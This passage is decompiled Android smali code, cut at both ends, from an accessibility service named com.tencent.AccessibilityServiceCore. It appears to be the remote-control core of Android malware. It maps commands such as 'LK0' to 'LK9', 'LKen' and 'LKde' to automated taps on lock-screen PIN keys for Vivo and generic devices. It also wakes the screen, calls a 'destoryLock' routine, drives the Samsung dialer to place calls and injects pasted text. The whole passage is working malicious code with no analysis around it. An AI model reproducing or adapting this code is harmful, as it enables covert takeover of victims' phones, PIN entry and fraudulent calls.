    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v3

    invoke-direct {v2, v15, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/high16 v3, 0x10000000

    .line 630
    invoke-virtual {v2, v3}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 631
    invoke-virtual {v1, v2}, Lcom/tencent/AccessibilityServiceCore;->startActivity(Landroid/content/Intent;)V

    const-wide/16 v3, 0x2710

    .line 632
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V

    .line 633
    invoke-virtual {v1, v9}, Lcom/tencent/AccessibilityServiceCore;->performGlobalAction(I)Z

    .line 636
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v3

    invoke-virtual {v3, v14}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v3

    const/high16 v4, 0x10000000

    .line 637
    invoke-virtual {v2, v4}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 638
    invoke-virtual {v1, v3}, Lcom/tencent/AccessibilityServiceCore;->startActivity(Landroid/content/Intent;)V

    .line 639
    invoke-static/range {v18 .. v19}, Ljava/lang/Thread;->sleep(J)V

    .line 640
    sget-object v2, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    sput-object v0, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012ToPaste:Ljava/lang/String;

    .line 641
    sget-object v0, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012NeedPaste:Ljava/lang/Boolean;

    .line 642
    sget-object v0, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012Treger()V

    .line 643
    invoke-static/range {v18 .. v19}, Ljava/lang/Thread;->sleep(J)V

    .line 644
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const-string v2, "com.samsung.android.dialer:id/image_view"

    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    .line 645
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    const-string v3, "com.samsung.android.dialer:id/dialButtonImage"

    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    const/4 v3, 0x0

    .line 646
    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v4, 0x10

    invoke-virtual {v0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    .line 647
    invoke-static/range {v18 .. v19}, Ljava/lang/Thread;->sleep(J)V

    .line 648
    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    goto/16 :goto_1a

    .line 655
    :cond_1d
    new-instance v2, Landroid/content/Intent;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {v0}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    invoke-direct {v2, v15, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/high16 v0, 0x10000000

    .line 656
    invoke-virtual {v2, v0}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 657
    invoke-virtual {v1, v2}, Lcom/tencent/AccessibilityServiceCore;->startActivity(Landroid/content/Intent;)V

    .line 658
    invoke-static/range {v16 .. v17}, Ljava/lang/Thread;->sleep(J)V

    .line 661
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0, v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    .line 662
    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v3

    const/4 v4, 0x2

    if-ne v3, v4, :cond_1e

    const/4 v3, 0x0

    .line 663
    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v3, 0x10

    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    const-wide/16 v3, 0x1f40

    .line 664
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V

    .line 665
    invoke-virtual {v1, v9}, Lcom/tencent/AccessibilityServiceCore;->performGlobalAction(I)Z

    .line 666
    invoke-virtual {v1, v2}, Lcom/tencent/AccessibilityServiceCore;->startActivity(Landroid/content/Intent;)V

    .line 668
    :cond_1e
    invoke-static/range {v16 .. v17}, Ljava/lang/Thread;->sleep(J)V

    .line 670
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0, v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    .line 672
    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v2

    const/4 v3, 0x2

    if-ne v2, v3, :cond_3a

    .line 673
    invoke-interface {v0, v9}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v2, 0x10

    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    goto/16 :goto_1a

    :cond_1f
    const-string v2, "LKde"

    .line 678
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_20

    .line 679
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    :try_start_5
    const-string v2, "com.android.systemui:id/delete_button"

    .line 682
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    const/4 v2, 0x0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    const/16 v2, 0x10

    .line 683
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1

    goto/16 :goto_1a

    :cond_20
    :try_start_6
    const-string v2, "LKen"

    .line 688
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_22

    .line 689
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_0

    :try_start_7
    const-string v2, "com.android.systemui:id/key_enter_text"

    .line 692
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    .line 693
    invoke-interface {v2}, Ljava/util/List;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_21

    const/4 v3, 0x0

    .line 694
    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    :goto_2
    const/16 v2, 0x10

    goto :goto_3

    :cond_21
    const/4 v3, 0x0

    const-string v2, "com.android.systemui:id/key_enter"

    .line 696
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    goto :goto_2

    .line 698
    :goto_3
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_1

    goto/16 :goto_1a

    :cond_22
    :try_start_8
    const-string v2, "LKnn"

    .line 703
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_23

    const/16 v2, 0x8

    .line 704
    invoke-virtual {v1, v2}, Lcom/tencent/AccessibilityServiceCore;->performGlobalAction(I)Z

    const-wide/16 v2, 0x3e8

    .line 705
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    .line 706
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->wakeupScreen()V

    const/4 v0, 0x3

    .line 707
    invoke-virtual {v1, v0}, Lcom/tencent/AccessibilityServiceCore;->performGlobalAction(I)Z

    const-wide/16 v2, 0x3e8

    .line 708
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    .line 709
    invoke-static/range {p0 .. p0}, Lcom/tencent/ScreenLockMonitor;->destoryLock(Lcom/tencent/AccessibilityServiceCore;)V

    goto/16 :goto_1a

    :cond_23
    const-string v2, "LK0"

    .line 710
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_25

    .line 712
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_0

    :try_start_9
    const-string v2, "com.android.systemui:id/VivoPinkey0"

    .line 717
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    .line 718
    invoke-interface {v2}, Ljava/util/List;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_24

    const/4 v3, 0x0

    .line 719
    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    :goto_4
    const/16 v2, 0x10

    goto :goto_5

    :cond_24
    const/4 v3, 0x0

    const-string v2, "com.android.systemui:id/key0"

    .line 721
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    goto :goto_4

    .line 723
    :goto_5
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_1

    goto/16 :goto_1a

    :cond_25
    :try_start_a
    const-string v2, "LK1"

    .line 727
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_27

    .line 728
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_0

    :try_start_b
    const-string v2, "com.android.systemui:id/VivoPinkey1"

    .line 731
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    .line 732
    invoke-interface {v2}, Ljava/util/List;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_26

    const/4 v3, 0x0

    .line 733
    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    :goto_6
    const/16 v2, 0x10

    goto :goto_7

    :cond_26
    const/4 v3, 0x0

    const-string v2, "com.android.systemui:id/key1"

    .line 735
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    goto :goto_6

    .line 737
    :goto_7
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_1

    goto/16 :goto_1a

    :cond_27
    :try_start_c
    const-string v2, "LK2"

    .line 741
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_29

    .line 742
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_0

    :try_start_d
    const-string v2, "com.android.systemui:id/VivoPinkey2"

    .line 745
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    .line 746
    invoke-interface {v2}, Ljava/util/List;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_28

    const/4 v3, 0x0

    .line 747
    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    :goto_8
    const/16 v2, 0x10

    goto :goto_9

    :cond_28
    const/4 v3, 0x0

    const-string v2, "com.android.systemui:id/key2"

    .line 749
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    goto :goto_8

    .line 751
    :goto_9
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_1

    goto/16 :goto_1a

    :cond_29
    :try_start_e
    const-string v2, "LK3"

    .line 755
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2b

    .line 756
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_0

    :try_start_f
    const-string v2, "com.android.systemui:id/VivoPinkey3"

    .line 759
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    .line 760
    invoke-interface {v2}, Ljava/util/List;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_2a

    const/4 v3, 0x0

    .line 761
    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    :goto_a
    const/16 v2, 0x10

    goto :goto_b

    :cond_2a
    const/4 v3, 0x0

    const-string v2, "com.android.systemui:id/key3"

    .line 763
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    goto :goto_a

    .line 765
    :goto_b
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_1

    goto/16 :goto_1a

    :cond_2b
    :try_start_10
    const-string v2, "LK4"

    .line 769
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2d

    .line 770
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_0

    :try_start_11
    const-string v2, "com.android.systemui:id/VivoPinkey4"

    .line 773
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    .line 774
    invoke-interface {v2}, Ljava/util/List;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_2c

    const/4 v3, 0x0

    .line 775
    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    :goto_c
    const/16 v2, 0x10

    goto :goto_d

    :cond_2c
    const/4 v3, 0x0

    const-string v2, "com.android.systemui:id/key4"

    .line 777
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    goto :goto_c

    .line 779
    :goto_d
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_1

    goto/16 :goto_1a

    :cond_2d
    :try_start_12
    const-string v2, "LK5"

    .line 783
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2f

    .line 784
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_0

    :try_start_13
    const-string v2, "com.android.systemui:id/VivoPinkey5"

    .line 787
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    .line 788
    invoke-interface {v2}, Ljava/util/List;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_2e

    const/4 v3, 0x0

    .line 789
    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    :goto_e
    const/16 v2, 0x10

    goto :goto_f

    :cond_2e
    const/4 v3, 0x0

    const-string v2, "com.android.systemui:id/key5"

    .line 791
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    goto :goto_e

    .line 793
    :goto_f
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    :try_end_13
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_13} :catch_1

    goto/16 :goto_1a

    :cond_2f
    :try_start_14
    const-string v2, "LK6"

    .line 797
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_31

    .line 798
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_14} :catch_0

    :try_start_15
    const-string v2, "com.android.systemui:id/VivoPinkey6"

    .line 801
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    .line 802
    invoke-interface {v2}, Ljava/util/List;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_30

    const/4 v3, 0x0

    .line 803
    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    :goto_10
    const/16 v2, 0x10

    goto :goto_11

    :cond_30
    const/4 v3, 0x0

    const-string v2, "com.android.systemui:id/key6"

    .line 805
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    goto :goto_10

    .line 807
    :goto_11
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_1

    goto/16 :goto_1a

    :cond_31
    :try_start_16
    const-string v2, "LK7"

    .line 811
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_33

    .line 812
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0
    :try_end_16
    .catch Ljava/lang/Exception; {:try_start_16 .. :try_end_16} :catch_0

    :try_start_17
    const-string v2, "com.android.systemui:id/VivoPinkey7"

    .line 815
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    .line 816
    invoke-interface {v2}, Ljava/util/List;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_32

    const/4 v3, 0x0

    .line 817
    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    :goto_12
    const/16 v2, 0x10

    goto :goto_13

    :cond_32
    const/4 v3, 0x0

    const-string v2, "com.android.systemui:id/key7"

    .line 819
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    goto :goto_12

    .line 821
    :goto_13
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    :try_end_17
    .catch Ljava/lang/Exception; {:try_start_17 .. :try_end_17} :catch_1

    goto/16 :goto_1a

    :cond_33
    :try_start_18
    const-string v2, "LK8"

    .line 825
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_35

    .line 826
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0
    :try_end_18
    .catch Ljava/lang/Exception; {:try_start_18 .. :try_end_18} :catch_0

    :try_start_19
    const-string v2, "com.android.systemui:id/VivoPinkey8"

    .line 829
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    .line 830
    invoke-interface {v2}, Ljava/util/List;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_34

    const/4 v3, 0x0

    .line 831
    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    :goto_14
    const/16 v2, 0x10

    goto :goto_15

    :cond_34
    const/4 v3, 0x0

    const-string v2, "com.android.systemui:id/key8"

    .line 833
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    goto :goto_14

    .line 835
    :goto_15
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    :try_end_19
    .catch Ljava/lang/Exception; {:try_start_19 .. :try_end_19} :catch_1

    goto/16 :goto_1a

    :cond_35
    :try_start_1a
    const-string v2, "LK9"

    .line 839
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_37

    .line 840
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0
    :try_end_1a
    .catch Ljava/lang/Exception; {:try_start_1a .. :try_end_1a} :catch_0

    :try_start_1b
    const-string v2, "com.android.systemui:id/VivoPinkey9"

    .line 843
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    .line 844
    invoke-interface {v2}, Ljava/util/List;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_36

    const/4 v3, 0x0

    .line 845
    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    :goto_16
    const/16 v2, 0x10

    goto :goto_17

    :cond_36
    const/4 v3, 0x0

    const-string v2, "com.android.systemui:id/key9"

    .line 847
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

